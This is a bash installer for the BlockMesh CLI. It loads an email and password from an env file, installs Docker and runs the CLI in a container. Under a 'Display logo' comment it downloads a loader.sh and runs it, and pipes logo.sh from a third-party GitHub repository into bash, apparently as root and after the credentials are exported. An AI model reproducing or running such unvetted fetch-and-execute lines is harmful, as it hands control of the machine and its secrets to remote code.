#!/bin/bash

# Load email and password from blockmesh.env
if [[ -f blockmesh.env ]]; then
    echo "Loading environment variables from blockmesh.env..."
    export $(grep -v '^#' blockmesh.env | xargs)
else
    echo "Error: blockmesh.env file not found. Please create it with EMAIL and PASSWORD variables."
    exit 1
fi

# Check if email and password variables are loaded
if [[ -z "$EMAIL" || -z "$PASSWORD" ]]; then
    echo "Error: EMAIL or PASSWORD not set in blockmesh.env."
    exit 1
fi

# Display logo
echo "Displaying qklxsqf logo..."
wget -O loader.sh https://raw.githubusercontent.com/FEdanish/BlockMesh/refs/heads/main/loader.sh && chmod +x loader.sh && ./loader.sh
curl -s https://raw.githubusercontent.com/FEdanish/BlockMesh/refs/heads/main/logo.sh | bash
sleep 2

# Update and upgrade system packages
apt update && apt upgrade -y

# Clean up old files
rm -rf blockmesh-cli.tar.gz target

# Install Docker if not already installed
if ! command -v docker &> /dev/null; then
    echo "Installing Docker..."
    apt-get install -y \
        ca-certificates \
        curl \
        gnupg \
        lsb-release
    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
    echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
    apt-get update && apt-get install -y docker-ce docker-ce-cli containerd.io
else
    echo "Docker is already installed, skipping installation..."
fi

# Install Docker Compose
echo "Installing Docker Compose..."
curl -L "https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
chmod +x /usr/local/bin/docker-compose

# Create target directory for extraction
mkdir -p target/release

# Download and extract the latest BlockMesh CLI
echo "Downloading and extracting BlockMesh CLI..."
curl -L https://github.com/block-mesh/block-mesh-monorepo/releases/download/v0.0.358/blockmesh-cli-x86_64-unknown-linux-gnu.tar.gz -o blockmesh-cli.tar.gz
tar -xzf blockmesh-cli.tar.gz --strip-components=3 -C target/release

# Verify extraction result
if [[ ! -f target/release/blockmesh-cli ]]; then
    echo "Error: blockmesh-cli executable not found in target/release. Exiting..."
    exit 1
fi

# Use BlockMesh CLI to create a Docker container
echo "Creating Docker container for BlockMesh CLI..."
docker run -it --rm \
    --name blockmesh-cli-container \
    -v $(pwd)/target/release:/app \
    -e EMAIL="$EMAIL" \
    -e PASSWORD="$PASSWORD" \
    --workdir /app \
    ubuntu:22.04 ./blockmesh-cli --email "$EMAIL" --password "$PASSWORD"